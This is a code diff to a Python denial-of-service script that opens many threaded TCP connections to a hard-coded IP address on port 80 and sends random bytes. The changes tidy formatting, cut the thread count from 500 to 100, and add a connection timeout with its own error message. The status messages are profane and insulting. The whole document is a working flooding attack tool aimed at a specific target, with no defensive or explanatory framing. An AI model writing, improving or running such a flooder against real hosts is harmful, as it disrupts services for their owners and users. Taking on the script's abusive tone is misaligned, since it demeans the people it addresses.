@@ -2,12 +2,15 @@ import socket
 import threading
 import random
 
-# Target IP and porta
+# Target IP and port
 ip = "194.193.147.22"
-port =80 # Packet size
-packet_size =1024
+port = 80
+
+# Packet size
+packet_size = 1024
+
 # Number of threads
-threads = 500
+threads = 100
 
 def random_bytes(size):
     """Generate a bytes object of random bytes"""
@@ -20,6 +23,9 @@ def flood():
             # Create a socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+            # Set a timeout for the connection attempt
+            sock.settimeout(1)
+
             # Connect to the target
             sock.connect((ip, port))
 
@@ -29,6 +35,8 @@ def flood():
             # Close the socket
             sock.close()
             print(f"Fuck yeah, packet sent successfully, you stupid shit! Total packets sent: {threading.active_count()}")
+        except socket.timeout:
+            print(f"Fuck, connection timed out, you damn idiot!")
         except Exception as e:
             print(f"Fuck, an error occurred: {e}")
 
